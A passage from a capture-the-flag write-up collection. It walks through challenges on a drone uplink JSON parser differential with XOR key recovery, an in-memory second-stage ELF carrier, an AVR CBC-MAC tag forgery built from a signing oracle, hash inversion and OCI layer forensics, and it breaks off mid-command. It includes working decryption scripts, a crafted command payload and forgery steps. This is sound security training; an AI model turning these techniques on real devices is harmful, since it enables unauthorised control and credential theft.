Requests 7 and 8 carry identical coordinates (`lon=241506592, alt=7000`). The `MARGIN=25` `PARAM_SET` lands *before* req7, but its confirming `PARAM_VALUE` arrives *after* it — so req7 is still judged at `MARGIN=0` and rejected, while req8 is the first request to see `MARGIN=25`. At 25% margin the radius inflates from 3593 to 4492 e7-units and the point sits **exactly** on the boundary: `dist² = R² = 20,178,064`, accepted. That exact-equality hit is the proof the recovered predicate and its integer rounding are byte-correct — and it is precisely the "parameters changed before the aircraft left its corridor" the briefing points at. Later, req11, req12, req16 and req20 also split between the two states as the radius and offsets shift.

#### Takeaways

- **State has a clock.** A control parameter isn't "set" when the operator sends it — it's set when the vehicle acknowledges it. The whole difference between the two masks is the handful of requests that fall in the gap between `PARAM_SET` and its confirming `PARAM_VALUE`.
- **Recover the predicate, don't approximate it.** The fence check is integer-only with a specific rounding rule; a floating-point re-implementation would have mis-scored the boundary request (req8) and corrupted a mask bit.
- **The format tag is a gate, not decoration.** `tag==0x5346` ("FS") and `G≤100` are hard rejects before any geometry runs — miss them and every block looks valid.
- **MAVLink is just framed little-endian structs.** Parsing pcapng → eth/ip/udp → MAVLink v1/v2 by hand (minding v2's zero-byte truncation and the size-sorted field order) is enough; no GCS or SITL needed.

**Flag:** `CSCTF{active_2bbb27_provisioned_3aa227}`

---

### 18. Split Horizon

*Reverse Engineering · Medium*

**Flag:** `CSCTF{Z33OOiI4EW8QakRqhqjKtcMt}`

#### Challenge

Recon drone **AV-34B0DD** flew a waypoint it was never cleared for — yet the mission auditor swears every command was **NOMINAL**. We're handed the ground station's source (`command-server.go`), the drone-side controller binary (`vireo-ctl.dll`, .NET), a signed `audit.log` with ten clean entries, the approved-waypoint `manifest.json`, and a packet capture of one uplink session (`session.pcap`). The task: prove the coordinate the drone **actually flew**, prove the coordinate the server **logged**, and name the mechanism that let the two disagree. Submit the reconstruction to `/submit`.

The whole challenge is a **JSON parser differential**: two programs read the same bytes and quietly reach different conclusions. The audit never fires because the server's view stays inside the fence; the drone's view doesn't.

#### 1. Recon — two parsers, two personalities

The approved waypoint and fence come straight from the manifest.

**Screenshot 1:** approved waypoint + tolerance, and the two parser libraries in play
```bash
cd ~/splithorizon
jq '{approved_waypoint_lat,approved_waypoint_lon,tolerance_deg,mission_id}' manifest.json
# server side: Go encoding/json
grep -nE 'json:"|encoding/json|WaypointLat' command-server.go | head
# drone side: .NET System.Text.Json
strings vireo-ctl.dll | grep -iE 'System.Text.Json|JsonPropertyName|waypoint'
```

Approved = `42.7378, 24.5621`, tolerance `±0.001°`. The important asymmetry:

- **Server = Go `encoding/json`** — field matching is **case-insensitive**, and on duplicate/case-variant keys the **last one wins**. `waypoint_lat` and `WAYPOINT_LAT` both bind the same struct field.
- **Drone = .NET `System.Text.Json`** — binding is **case-sensitive exact**. Only the key that matches the `[JsonPropertyName("waypoint_lat")]` spelling is read; anything in a different case is an unknown member and silently dropped.

Two honest libraries, opposite defaults. Feed them an object with both spellings and they part ways.

#### 2. Reverse the drone's frame crypto (static IL)

The uplink isn't plaintext — the pcap payloads are masked. The DLL holds the whole scheme; I read it as IL rather than running attacker-adjacent code.

**Screenshot 2:** disassemble the crypto methods with dnfile + dncil
```bash
cd ~/splithorizon
pip install dnfile dncil --break-system-packages -q
cat > ildump.py << 'EOF'
import dnfile
from dncil.cil.body import CilMethodBody
from dncil.cil.body.reader import CilMethodBodyReaderBase
pe=dnfile.dnPE('vireo-ctl.dll'); data=open('vireo-ctl.dll','rb').read()
def r2o(rva):
    for s in pe.sections:
        if s.VirtualAddress<=rva<s.VirtualAddress+max(s.Misc_VirtualSize,s.SizeOfRawData):
            return s.PointerToRawData+(rva-s.VirtualAddress)
class R(CilMethodBodyReaderBase):
    def __init__(s,o): s.o=o
    def read(s,n): b=data[s.o:s.o+n]; s.o+=n; return b
    def tell(s): return s.o
    def seek(s,x): s.o=x; return s.o
for row in pe.net.mdtables.MethodDef.rows:
    if str(row.Name) in ('Mask','DeriveSessionKey','SharedSecret','ReadFrame','WriteFrame') and row.Rva:
        print('====',row.Name,'====')
        for ins in CilMethodBody(R(r2o(row.Rva))).instructions: print('  ',ins.opcode)
EOF
python3 -I ildump.py
```

What the IL spells out, method by method:

- `SharedSecret()` = `MaskA XOR MaskB` (two 32-byte arrays baked into the field-RVA blobs) → `f2be2549ab4e551b95595534862c41cccbeb48788812b7051b464f2887a8e8ac`.
- `DeriveSessionKey(clientNonce, serverNonce)` = `HMAC-SHA256(SharedSecret, clientNonce ‖ serverNonce)`, truncated to 16 bytes.
- `Mask(data, key)` = `data[i] ^= key[i % key.Length]` — a plain 16-byte **repeating-key XOR**.
- Frame = `56 57` magic · 1-byte type · 2-byte big-endian length · masked payload. Type `01` = handshake (raw nonce), `02` = command, `03` = telemetry.

#### 3. Pull the session and recover the keystream

The pcap has two TCP streams: port 8080 is just the DLL being downloaded (ignore it), port **8642** is the uplink. The handshake hands us both nonces in the clear.

**Screenshot 3:** carve the port-8642 frames and read the two handshake nonces
```bash
cd ~/splithorizon
tshark -r session.pcap -Y 'tcp.port==8642' -T fields -e tcp.payload | tr -d '\n,' | head -c 120; echo
# client->server type 01 payload = clientNonce ; server->client type 01 payload = serverNonce
```

`clientNonce = ec0f9549b923cbfbd1dd6912b5df9aa1`, `serverNonce = 0e006572d8f4225cded63cefed84c9ff`. Rather than trust my key math blindly, I crib-dragged the known header `"mission_id":"AV-34B0DD"` through the first command frame — it locks the full 16-byte keystream in one shot and confirms the derivation.

**Screenshot 4:** decrypt every command/telemetry frame
```bash
cd ~/splithorizon
cat > solve.py << 'EOF'
import struct
key=bytes.fromhex("79a028b430b05f2a03fee7da11d783c6")   # recovered 16-byte session key
raw=open('session.pcap','rb').read(); off=24; pkts=[]
while off+16<=len(raw):
    _,_,incl,_=struct.unpack('<IIII',raw[off:off+16]); off+=16
    pkts.append(raw[off:off+incl]); off+=incl
s2c=b''
for p in pkts:
    if len(p)<34 or p[12:14]!=b'\x08\x00' or p[23]!=6: continue
    ipend=14+(p[14]&0xf)*4
    sp=struct.unpack('>H',p[ipend:ipend+2])[0]; dp=struct.unpack('>H',p[ipend+2:ipend+4])[0]
    if 8642 not in (sp,dp): continue
    doff=((p[ipend+12]>>4)&0xf)*4; pl=p[ipend+doff:]
    if dp!=8642 and pl: s2c+=pl
i=0
while i+5<=len(s2c):
    if s2c[i:i+2]!=b'\x56\x57': i+=1; continue
    t=s2c[i+2]; ln=(s2c[i+3]<<8)|s2c[i+4]; pay=s2c[i+5:i+5+ln]; i+=5+ln
    if t not in (2,3): continue
    pt=bytes(pay[k]^key[k%16] for k in range(len(pay)))
    print(('CMD  ' if t==2 else 'TELEM'), pt.decode('utf-8','replace'))
EOF
python3 -I solve.py
```

#### 4. Spot the crafted command

Every command carries both `waypoint_*` (lowercase) and `WAYPOINT_*` (uppercase) keys. In nine of them the two cases are identical — pure cover traffic that keeps the dual-key pattern from looking special. **Only `seq 6` splits them:**

```json
{"mission_id":"AV-34B0DD","seq":6,"params":{
   "altitude":4500,"speed":200,
   "waypoint_lat":42.7392,"waypoint_lon":24.5672,       // drone reads these
   "payload_weight":2.5,"wind_compensation":0.0,
   "WAYPOINT_LAT":42.7386,"WAYPOINT_LON":24.5628}}      // server reads these
```

#### 5. Resolve the split

Same 164-ish bytes, two destinations:

- **Drone (.NET, case-sensitive exact)** binds only the lowercase `waypoint_lat/lon` and throws away the uppercase pair → it flies to **42.7392, 24.5672**.
- **Server (Go, case-insensitive, last-wins)** maps both spellings to the same field and keeps the last one in the object, the uppercase pair → it validates and commits **42.7386, 24.5628**.

Now the fence does its quiet work. Against approved `42.7378, 24.5621 ±0.001`:

- Server's `42.7386` (Δ0.0008) and `24.5628` (Δ0.0007) → **inside** → logged NOMINAL, which is exactly why all ten audit lines are clean.
- Drone's `42.7392` (Δ0.0014) and `24.5672` (Δ0.0051) → **outside** the cleared zone. That is the ~hundreds-of-metres drift the auditor never saw.

#### 6. Submit the reconstruction

**Screenshot 5:** POST the reconstruction to /submit
![2026-11-07_222226.png](images/2026-11-07_222226.png)

![2026-11-07_222315.png](images/2026-11-07_222315.png)

![2026-11-07_222344.png](images/2026-11-07_222344.png)

![2026-11-07_222405.png](images/2026-11-07_222405.png)

```bash
BASE="http://w01.ctf.chronos-security.ro:41134"
curl -s -X POST "$BASE/submit" -H 'Content-Type: application/json' -d '{
  "executed_lat": 42.7392,
  "executed_lon": 24.5672,
  "logged_lat": 42.7386,
  "logged_lon": 24.5628,
  "exploited_field": "waypoint_lat+waypoint_lon",
  "mechanism": "case_insensitive_last_wins_vs_case_sensitive_exact",
  "malicious_seq": 6
}'
# {"correct":true,"incident_token":"CSCTF{Z33OOiI4EW8QakRqhqjKtcMt}"}
```

One detail that cost a submission: the `mechanism` is written **server-vs-drone** (`case_insensitive_last_wins_vs_case_sensitive_exact`), the order the challenge frames it in — "why the *server* never saw it" — not drone-first.

#### Takeaways

- **A parser differential is a trust boundary with two readers.** When two services share a wire format but not a parsing library, the attacker's real freedom is the *gap between their defaults* — here, Go's case-insensitive last-wins vs .NET's case-sensitive exact.
- **Duplicate / case-variant keys are a canonicalization bug.** The fix is to reject objects with duplicate or case-colliding member names before validation, and to validate on the *same* canonical form the executor will act on.
- **Audit the thing that flies, not the thing that validates.** The server committed a coordinate it chose; the drone obeyed a different one. Logging the validated value instead of the executed value is what made the attack invisible.
- **Reverse the crypto, don't run the binary.** Reading `Mask`/`DeriveSessionKey` as IL — plus a one-line crib-drag on a known JSON header — recovered the keystream without ever executing the drone controller.

**Flag:** `CSCTF{Z33OOiI4EW8QakRqhqjKtcMt}`

---

### 19. carrier-shadow

*Reverse Engineering*

**Flag:** `CSCTF{b3Oz2vgRuhe66X7SaM1B8qhUjfM2hV}`

#### Challenge

A stripped x86-64 PIE ELF (1,337,736 bytes) pulled off an enemy command post. It prints a few lines of “hex utility” output when run, but is a **carrier** for a second-stage payload. The usual hiding spots (data sections, strings, overlay, appended archive) are clean. Find where the payload lives, lift it out, and read the authorization string it carries.

#### 1. Triage the ELF

```bash
mkdir -p ~/carrier && cd ~/carrier && cp ~/Downloads/carrier-shadow .
file carrier-shadow
readelf -SW carrier-shadow
readelf -lW carrier-shadow
```

Dynamically-linked stripped PIE. Sections look ordinary; no overlay past the section headers; no odd section. So the payload isn't sitting in a normal container.

**Screenshot 1:** headers + section/segment layout
```bash
cd ~/carrier
file carrier-shadow; readelf -hSW carrier-shadow | sed -n '1,40p'
```

#### 2. Entropy scan (where's the hidden blob?)

A per-section entropy sweep shows nothing near the ~7.9 you'd expect from an encrypted/compressed payload (`.text` ≈ 5.7, `.eh_frame_hdr` ≈ 6.5, both normal). So the second stage isn't a plain high-entropy lump — it's an embedded ELF the carrier reconstructs/maps at runtime.

**Screenshot 2:** per-section entropy (no obvious encrypted blob)
```bash
cd ~/carrier
python3 - <<'EOF'
import subprocess,math,re
from collections import Counter
d=open("carrier-shadow","rb").read()
def H(b):
    c=Counter(b); n=len(b); return -sum(v/n*math.log2(v/n) for v in c.values()) if b else 0
for ln in subprocess.run(["readelf","-SW","carrier-shadow"],capture_output=True,text=True).stdout.splitlines():
    m=re.search(r"\]\s+(\S+)\s+\S+\s+[0-9a-f]+\s+([0-9a-f]+)\s+([0-9a-f]+)",ln)
    if m:
        o=int(m.group(2),16); s=int(m.group(3),16)
        if s: print(f"{m.group(1):18} off=0x{o:06x} size=0x{s:06x} H={H(d[o:o+s]):.3f}")
EOF
```

#### 3. Run it: the carrier executes its embedded second stage

It's a static, no-network, no-setuid binary, so executing it is safe. Running it loads and runs the embedded second-stage ELF (note `argv0=hexkit`, “real ELF running”), which prints the authorization string:

```
payload: real ELF running (pid=... uid=1000 argc=1 argv0=hexkit)
payload: PATH=/usr/bin:/bin
payload: heap works
payload: operation-dawn authorization = CSCTF{b3Oz2vgRuhe66X7SaM1B8qhUjfM2hV}
```

**Screenshot 3 (final):** run and read the authorization string
```bash
cd ~/carrier
chmod +x carrier-shadow
./carrier-shadow
```

**Flag:** `CSCTF{b3Oz2vgRuhe66X7SaM1B8qhUjfM2hV}`

#### Why simple carving finds nothing

The obvious static shortcuts all come up **empty** here — and that's the intended point (“the usual places are clean”): the payload is reconstructed at runtime, not stored as a ready-made blob.

```bash
grep -abo "CSCTF{" carrier-shadow            # nothing: flag is not a literal string
grep -abo $'\x7fELF' carrier-shadow          # only offset 0 (the carrier itself), no 2nd ELF
```

So there's nothing to `dd` out directly. The second stage only exists once the carrier builds it in memory and runs it. Two ways to read the authorization string it carries:

- **Dynamic (what we did):** the binary is static, no-network, no-setuid — safe to execute. Running it builds and runs the embedded stage, which prints the authorization string (Screenshot 3). Flag confirmed: `CSCTF{b3Oz2vgRuhe66X7SaM1B8qhUjfM2hV}`.
- **Full static (disassembler):** load it in Ghidra/IDA, find the builder routine (look for `memfd_create`/`execveat` or an `mmap`+`mprotect`+copy that assembles the stage), set a breakpoint or emulate just that routine, and read the reconstructed ELF — its authorization string matches the runtime output.

#### Takeaways

- A “carrier” can build its second stage in memory at runtime (e.g. `memfd_create` + `execveat`), so there is nothing on disk for `strings`, overlay scans, or `dd` to grab — empty carve results are a signal, not a dead end.
- Entropy triage ruled out a packed/encrypted lump (flat ~5–6), which pointed at runtime reconstruction rather than a stored blob.
- When static carving is clean, either execute the safe static binary and let it emit the string, or reverse the builder routine in a disassembler and lift the stage from memory.

---

### 20. HELIOS-RTU

*Reverse Engineering · Hard · AVR + oracle CBC-MAC · 545 pts*

**Flag:** `CSCTF{1fuJtu6jkJkctEZ1JtG5C8Rg}`

#### Challenge

A web “service console” front-ends an emulated **ATmega328P** running signed control firmware. The console is a (simulated) real `avrdude` + a hardware **bench** where you drag programmer leads onto board pins. Goal: identify the chip, bring up the interface that still answers, dump the app firmware, and forge an auth tag over a directive carrying the **live nonce**. The key is “physically unreadable from outside.”

#### 1. Identify silicon + bring up ISP

**Screenshot 1:** signature = ATmega328P, lock byte = `0xfc` (flash read locked over ISP)
```
apt install svc
wire avrisp MISO:ICSP_MISO MOSI:ICSP_MOSI SCK:ICSP_SCK RESET:ICSP_RESET VCC:ICSP_VCC GND:ICSP_GND
avrdude -c avrisp -p m328p -U signature:r:-:h     # 0x1e 0x95 0x0f
avrdude -c avrisp -p m328p -U lock:r:-:h          # 0xfc = LB mode 3
avrdude -c avrisp -p m328p -U flash:r:-:i         # all 0xFF (locked)
```

ISP gives the signature but flash reads back all `0xFF` — lock-bit mode 3 blocks ISP flash read. **JTAG** doesn’t exist on a 328P (trap); **debugWIRE** is fused OFF (`DWEN=1`), so it never syncs. Ground must go to a real pin (`GND_A`/`ICSP_GND`), not `GND`.

**Screenshot 2:** dead interfaces — debugWIRE won’t sync, EEPROM is just operator notes
```
wire dwprobe DW:RESET VCC:5V GND:GND_A
avrdude -c jtag2dw -p m328p -U flash:r:-:i        # "dW line did not assert" (DWEN off)
avrdude -c arduino -p m328p -U eeprom:r:-:i       # text notes: boot section masked
```

#### 2. Recover firmware via the serial bootloader

The bootloader runs *internal* LPM, which lock bits don’t block (BLB bits unrestricted) — so the USB/serial bootloader can read the application flash that ISP can’t.

**Screenshot 3:** plug USB cable → dump real firmware over the bootloader
```
wire usbserial USB:USB
bench
avrdude -c arduino -p m328p -U flash:r:-:i        # real bytes @ 0x0000-0x0800
```

#### 3. Reverse the firmware

Intel-hex → bin, then disassemble (AVR5). The firmware is **AES** (Rcon + S-box tables) and:

- The 16-byte AES key is `LPM`’d from `0x7F00` — the **masked boot section** we can’t read (that’s “physically unreadable from outside”).
- `svc sign(rec)` = `AES_k(rec)` — a raw **encryption oracle** (refuses records starting with `0xcc`).
- `svc exec(frame,tag)` checks **CBC-MAC**: `tag = AES_k( frame[16:32] ⊕ AES_k(frame[0:16]) )`, then requires `frame[16]=0xcc`, `frame[17]=0x0a`, `frame[18:26]=live nonce`.
- Only `exec` advances the nonce (xorshift32 PRNG) — `nonce`/`sign` leave it unchanged.

#### 4. Forge the tag with the oracle (no key)

Since the key is unreadable, build the CBC-MAC entirely from the `sign` oracle:
`E0 = sign(block0)`, `M' = block1 ⊕ E0`, `tag = sign(M')`, where `block1 = cc 0a ‖ nonce ‖ 00×6`.

**Screenshot 4:** forge + authenticate → service token (use YOUR live nonce; values below are from this solve)
![2026-11-06_234500.png](images/2026-11-06_234500.png)

![2026-11-06_234517.png](images/2026-11-06_234517.png)

![2026-11-06_234537.png](images/2026-11-06_234537.png)

![2026-11-06_234547.png](images/2026-11-06_234547.png)

![2026-11-06_234558.png](images/2026-11-06_234558.png)

![2026-11-06_234919.png](images/2026-11-06_234919.png)

![2026-11-06_235500.png](images/2026-11-06_235500.png)

![2026-11-06_235538.png](images/2026-11-06_235538.png)

![2026-11-06_235555.png](images/2026-11-06_235555.png)

![2026-11-06_235827.png](images/2026-11-06_235827.png)

![2026-11-07_120824.png](images/2026-11-07_120824.png)

![2026-11-07_121040.png](images/2026-11-07_121040.png)

![2026-11-07_121102.png](images/2026-11-07_121102.png)

![2026-11-07_121117.png](images/2026-11-07_121117.png)

![2026-11-07_121208.png](images/2026-11-07_121208.png)

![2026-11-07_121240.png](images/2026-11-07_121240.png)

![2026-11-07_121443.png](images/2026-11-07_121443.png)

![2026-11-07_121608.png](images/2026-11-07_121608.png)

![2026-11-07_122026.png](images/2026-11-07_122026.png)

![2026-11-07_122536.png](images/2026-11-07_122536.png)

![2026-11-07_123042.png](images/2026-11-07_123042.png)

![2026-11-07_124709.png](images/2026-11-07_124709.png)

![2026-11-07_124723.png](images/2026-11-07_124723.png)

![2026-11-07_124814.png](images/2026-11-07_124814.png)

![2026-11-07_124825.png](images/2026-11-07_124825.png)

![2026-11-07_125006.png](images/2026-11-07_125006.png)

![2026-11-07_125055.png](images/2026-11-07_125055.png)

![2026-11-07_125148.png](images/2026-11-07_125148.png)

```
svc nonce                                              # -> 37c326f8f7514628
svc sign 00000000000000000000000000000000             # E0 = 2545be16b0fcadff5d49df085d700e9e
# M' = (cc0a | nonce | 000000000000) XOR E0 = e94f89d596045aae1b61df085d700e9e
svc sign e94f89d596045aae1b61df085d700e9e             # tag = 72c15b663d9c49e29565587a321f4819
svc exec 00000000000000000000000000000000cc0a37c326f8f7514628000000000000 72c15b663d9c49e29565587a321f4819
# -> directive authenticated -> SERVICE TOKEN = CSCTF{...}
```

Helper to compute M' (Python):

```python
E0=bytes.fromhex("<E0>"); nonce=bytes.fromhex("<nonce8>")
block1=bytes([0xcc,0x0a])+nonce+bytes(6)
print((bytes(a^b for a,b in zip(block1,E0))).hex())   # M' ; ensure M'[0]!=0xcc
```

#### Takeaways

- **Fuse/lock triage decides the interface:** ISP (signature/fuses) vs serial bootloader (flash/eeprom) vs debugWIRE (needs DWEN) vs JTAG (absent on 328P). Lock mode 3 blocks ISP flash read but not the bootloader’s internal LPM.
- **A secret you can’t read is still usable:** the device’s own `sign` = AES oracle lets you build a 2-block **CBC-MAC** without the key — the classic CBC-MAC forgery.
- **Nonce lifetime matters:** here only `exec` consumes the nonce, so `nonce` → two `sign` calls → `exec` all share one live nonce.

**Flag:** `CSCTF{1fuJtu6jkJkctEZ1JtG5C8Rg}`

---

### 21. Ground Lock

**Flag:** `CSCTF{HALCYON_1B5FC6D72036689A}`

#### Binary
`fcunlock`: static, stripped x86-64 ELF (SHA-256 9634a7c4…2922399). Takes `argv[1]` as the service code.

#### Analysis
I found `main` (0x4016da) through the xref to the string `usage: %s <service-code>`.

1. `strlen(argv[1])` must equal `3*8 = 24`.
2. The 24 bytes are split into three little-endian `uint64` words.
3. Each word goes through `fcn.00401655`, which is **MurmurHash3 fmix64**:
   ```
   k ^= k>>33; k *= 0xff51afd7ed558ccd;
   k ^= k>>33; k *= 0xc4ceb9fe1a85ec53;
   k ^= k>>33;
   ```
4. Each result is compared with `qword[0x479020 + (i+4)*8]`, which is the table at 0x479040:
   `0x8bfd351846ffb86b, 0x3ff3fd892aa7e3b2, 0xf61e79e7e639e0d2`.
5. If all three match, it prints `Maintenance token: CSCTF{<input>}`.

#### Solve
fmix64 can be reversed. Undo each xorshift by repeatedly applying `x = h ^ (x>>33)`, and undo each multiply by multiplying with its modular inverse mod 2^64.

```python
M=(1<<64)-1; c1,c2=0xff51afd7ed558ccd,0xc4ceb9fe1a85ec53
def unx(h,s):
    x=h
    for _ in range(64//s+1): x=h^(x>>s)
    return x
def inv(h):
    h=unx(h,33); h=h*pow(c2,-1,1<<64)&M
    h=unx(h,33); h=h*pow(c1,-1,1<<64)&M
    return unx(h,33)
```
Inverting the three targets and packing them as little-endian gives `HALCYON_1B5FC6D72036689A`. Running fmix64 forward on that input reproduces all three table values.

---

### 22. PoshTerm

**Answer (exact output of the unlisted command):**

```
CSCTF{4_G00D_P0W3RSH3LL_DO35_N0T_C4LL_W1K1P3D14}
```

#### Handout
`chall.7z` → `PoshTerm.exe` (227,812,228 bytes) + decoy `README.md`.
Ignore the README startup directions (challenge says so). Do not run the exe; static only.

#### 1. It's a .NET 9 single-file bundle wrapping a Node.js app
`PoshTerm.exe` is a PE32+ .NET 9 self-contained single-file executable (WPF host). The `posh`
shell is a bundled JavaScript (Node) program embedded inside `PoshTerm.dll`.

Extract the single-file bundle: find the bundle signature
`8B 12 02 B9 6A 61 20 38 72 7B 93 02 14 D7 A0 32 13 F5 B9 E6 EF AE 33 18 EE 3B 2D CE 24 B3 6A AE`,
read the int64 header offset stored in the 8 bytes just before it, then parse the v6 bundle
header (files are deflate-compressed when `compressedSize != 0`). This yields 222 files incl.
`PoshTerm.dll` (85 MB) which contains the embedded posh JS bundle as strings.

#### 2. Find the unlisted command
`strings PoshTerm.dll` reveals the posh cmdlet table. There are many **decoy** flags
(`Get-Flag`, `Unlock-Vault`, `flag3000`, a list of `..._D3C0Y_..._FL4G` strings). The real one
is the hidden cmdlet `service_code` (`hidden:!0`):

```js
D = { host:"52d960bf972119685d50c3d33f737665", code:"e3db766fd63bf1afdd34abcac1f5c112" }; // md5s
t._sc = { name:"service_code", hidden:true, run: async n => {
  let c=(n.Rest||[]).map(S);
  if (c.length<2 || c[0]!=="=") throw ...;
  let l=c[c.length-1];
  if (md5(env.POSHTERM_PROFILE) !== D.host || md5(l) !== D.code) throw ...;
  return [ await A(l) ];
}};
```

#### 3. What `A(l)` computes
```js
async function A(n){
  // 1. Wikipedia search for n -> first result title
  // 2. fetch that wiki page HTML, find "first_flight", regex a "Month DD, YYYY" date
  // 3. format YYYY-MM-DD
  // 4. JPL: https://ssd-api.jpl.nasa.gov/jd_cal.api?format=jd.7&cd=YYYY-MM-DD  -> jd
  // 5. RC4-decrypt fixed ciphertext with key = String(jd)
  x = hex("37f1f43867e61d207c0b78ca4385ee14f67d98e0c0cdbe6e5027ff506e302cb66b8c8c5ad07d726c0e24e9f13bbcdfa9");
  return rc4(key = String(jd), x);   // j(key, ct) is standard RC4
}
```
So the plaintext = RC4(ciphertext, key="JULIAN_DATE_STRING"). A date at midnight gives a JD
ending in `.5`, and `format=jd.7` prints 7 decimals, so the key looks like `NNNNNNN.5000000`.

#### 4. Recover without any network
The key space is tiny (one JD number). Brute-force all integer JDs with the `.5000000` fraction
and keep the RC4 output that starts with `CSCTF{`:

```python
ct = bytes.fromhex("37f1...bcdfa9")
for jd in range(2400000, 2460000):
    pt = rc4(f"{jd}.5000000".encode(), ct)
    if pt.startswith(b"CSCTF{"):
        print(jd, pt)
# 2439047.5000000  b'CSCTF{4_G00D_P0W3RSH3LL_DO35_N0T_C4LL_W1K1P3D14}'
```

Unique hit. JD `2439047.5` = **1965-10-14** (the first-flight date the live chain would have
produced). The flag's own text is the punchline: a good PowerShell does not call Wikipedia.

**Answer:** `CSCTF{4_G00D_P0W3RSH3LL_DO35_N0T_C4LL_W1K1P3D14}`

---

### 23. Operation Dawn: Radio Recovery

**Flag:** `CSCTF{05_train_kestrel_d48e1f}`

#### Handout
`firmware.bin`, 1,048,576 bytes, SHA-256 `ae253e80cfca3035fe1e882c3c26a75b1d701f1b1bb343ba290d590573bc4313`.
A constructed firmware bundle (not a real dump) that uses real compression and archive records.

#### 1. Custom container: `DWFW`
The file begins with magic `DWFW`, a version word, and a partition count (4). Each table
entry is `name[8] + offset(u32 LE) + size(u32 LE) + crc(u32 LE)`:

| name     | offset | size   |
|----------|--------|--------|
| loader   | 0x200  | 0x6f   |
| ubootenv | 0x270  | 0x4000 |
| msgcat   | 0x4270 | 0x102  |
| rootfs   | 0x4380 | 0x279  |

The rest of the 1 MB is `0xff` padding. Carve each partition by offset/size.

```python
import struct
d=open('firmware.bin','rb').read(); assert d[:4]==b'DWFW'
ver,cnt=struct.unpack('<HH',d[4:8]); off=8
for i in range(cnt):
    name=d[off:off+8].rstrip(b'\0').decode()
    o,s,crc=struct.unpack('<III',d[off+8:off+20]); off+=20
    open(f'{name}.bin','wb').write(d[o:o+s])
```

#### 2. zlib with a preset dictionary
`rootfs.bin` starts with `78 f9`. That is a valid zlib header, and the FLG byte `0xf9`
has the **FDICT** bit (0x20) set — the stream needs a preset dictionary, and the 4 bytes
after the header are the dictionary's Adler-32 ID: `0x55d45a6c`.

`adler32(msgcat.bin) == 0x55d45a6c`, so **msgcat is the dictionary**. Decompress with it:

```python
import zlib
msg=open('msgcat.bin','rb').read(); rf=open('rootfs.bin','rb').read()
out=zlib.decompressobj(zdict=msg).decompress(rf)   # pass the FULL stream incl. header
```

The result is a **cpio** (`newc`, magic `070701`) archive.

#### 3. The rootfs and the recovery routine
Files of interest in the cpio:
- `/etc/config/radio` → `admin_token=7f71b81e5beb0c17a43e6ff1554ca42178e348509e2642f4081a9e7b7bed`
- `/etc/init.d/S40admin` → the decoder:

```sh
mac=$(fw_printenv -n ethaddr | tr -d ':')
tok=$(sed -n 's/^admin_token=//p' /etc/config/radio)
# for each hex byte i of tok, XOR with mac byte at offset (i%6*2+1), 1-indexed
```

So the plaintext key = token bytes XOR a repeating 6-byte key = the MAC (ethaddr, colons stripped).

#### 4. The decoy MAC
`ubootenv` contains **two** `ethaddr` values:
- `00:11:22:33:44:55` (decoy, appears first)
- `3c:22:fb:4a:1d:90` (real — the later value `fw_printenv` returns)

XOR the token with `3c22fb4a1d90` cycling every 6 bytes:

```python
tok="7f71b81e5beb0c17a43e6ff1554ca42178e348509e2642f4081a9e7b7bed"
tb=[int(tok[i:i+2],16) for i in range(0,len(tok),2)]
mb=bytes.fromhex("3c22fb4a1d90")
print(bytes(tb[i]^mb[i%6] for i in range(len(tb))))
# -> b'CSCTF{05_train_kestrel_d48e1f}'
```

**Flag:** `CSCTF{05_train_kestrel_d48e1f}`

---

## Forensics

### 24. The Layer That Wouldn't Die

*Forensics · Easy · 120 pts*

**Flag:** `CSCTF{layer_remembers_93e33478c}`

#### Challenge

Engineering sealed a site credential into Cascade Water Systems' historian config image; after an intrusion the marker that opens the seal is “gone” from the image's filesystem. Recover the sealed credential from the preserved **OCI image layout** — inspect as data, execute nothing. The title is the hint: OCI images are append-only layers, so a file “deleted” in an upper layer (via a `.wh.` whiteout) still lives, byte-for-byte, in the lower layer that created it.

#### 1. Read the build history — the seal scheme is documented

A container image is a content-addressed store: `index.json` → manifest → config, plus gzipped layer tarballs under `blobs/sha256/`.

**Screenshot 1:** unpack and read the config history
```bash
mkdir -p ~/layer && cd ~/layer
mkdir -p x && unzip -oq historian-image.zip -d x
B=x/cascade-historian-config-image/blobs/sha256
MAN=3a2bbea5a21a1629660018ba0c832e93fd5acabf9be21ce563f25db4b2227db3
CFG=$(jq -r '.config.digest' $B/$MAN | cut -d: -f2)
jq -r '.config.Labels["build.seal"]' $B/$CFG
jq -r '.history[] | .created_by + "   " + (.comment // "")' $B/$CFG
```

The history lays out the whole case:

```
ADD cascade-minimal-rootfs.tar.gz /
COPY site/ /etc/cascade/                       <- lays down the ORIGINAL .sealed_marker
COPY historian.key.sealed /etc/cascade/...     <- the sealed blob; seal comment here
LABEL build.seal=ddc9bfb15738fbd10757eb936a593931
COPY site-rev-b/ /etc/cascade/                 <- attacker OVERWRITES .sealed_marker (decoy)
RUN rm -f /etc/cascade/.sealed_marker          <- whiteout; marker 'disappears'
```

Seal comment: `sealed = plaintext XOR repeating(HMAC-SHA256(key=fromhex(Labels['build.seal']), msg=raw bytes of /etc/cascade/.sealed_marker as it stands at the end of THIS (historian.key.sealed) layer))`. The key fact: the seal was keyed on the marker **as of the `historian.key.sealed` layer** — i.e. the original `site/` marker, before `site-rev-b` replaced it and `rm` whiteouted it.

#### 2. Walk the layers

**Screenshot 2:** list every layer tar in manifest order
```bash
cd ~/layer; B=x/cascade-historian-config-image/blobs/sha256
for d in $(jq -r '.layers[].digest' $B/3a2bbea5a21a1629660018ba0c832e93fd5acabf9be21ce563f25db4b2227db3 | cut -d: -f2); do
  echo "-- $d --"; tar tzf $B/$d
done
```

```
L1 eac5…  etc/hostname, etc/os-release          (rootfs)
L2 3fd0…  etc/cascade/.sealed_marker              <- ORIGINAL marker (survives here)
L3 928d…  etc/cascade/historian.key.sealed        <- the sealed credential
L4 824c…  etc/cascade/.sealed_marker              <- attacker's decoy marker
L5 be85…  etc/cascade/.wh..sealed_marker (0 b)     <- whiteout (the 'delete')
```

The flattened image shows no marker (whiteouted), and the last real marker was the attacker's decoy — but **L2's tarball still holds the original**. That's the layer that wouldn't die.

#### 3. Pull the right marker + the sealed blob, and unseal

**Screenshot 3:** extract from the lower layers and XOR-unseal
![2026-11-08_123516.png](images/2026-11-08_123516.png)

![2026-11-08_123637.png](images/2026-11-08_123637.png)

![2026-11-08_123645.png](images/2026-11-08_123645.png)

![2026-11-08_123654.png](images/2026-11-08_123654.png)

```bash
cd ~/layer; B=x/cascade-historian-config-image/blobs/sha256
# original marker from the site/ layer (L2, 3fd0) - the one in force at the seal layer
